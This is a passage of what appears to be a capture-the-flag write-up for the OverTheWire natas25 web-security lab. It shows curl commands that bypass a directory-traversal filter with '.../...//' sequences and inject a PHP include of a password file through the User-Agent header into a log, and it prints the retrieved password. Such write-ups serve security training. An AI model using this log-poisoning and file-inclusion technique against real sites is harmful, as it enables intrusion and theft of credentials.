@@ -1,0 +1,17 @@
+While trying to understand if that could work, I casually found that the value of pwd is /var/www/natas/natas25. Indeed
+
+% curl -u natas25:$(cat natas25.password) -sL http://natas25.natas.labs.overthewire.org?lang=.../...//index.php|tail
+<div align=”right”>
+<form>
+<select name=’lang’ onchange=’this.form.submit()’>
+<option>language</option>
+<option>de</option><option>en</option></select>
+</form>
+</div><br />
+<b>Fatal error</b>: Cannot redeclare setLanguage() (previously declared in /var/www/natas/natas25/index.php:18) in <b>/var/www/natas/natas25/index.php</b> on line <b>18</b><br />
+
+So we now know how much we need to traverse back to reach /
+
+% export PREVIOUS_DIR='.../.../'
+% curl -u natas25:$(cat natas25.password) -b PHPSESSID=meow -sL -H "User-Agent: <?php include '/etc/natas_webpass/natas26'; ?>" "http://natas25.natas.labs.overthewire.org?lang=$PREVIOUS_DIR/$PREVIOUS_DIR/$PREVIOUS_DIR/$PREVIOUS_DIR/$PREVIOUS_DIR/tmp/natas25_meow.log"...[23.07.2016 11::34:29] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+ “Directory traversal attempt! fixing request.”...
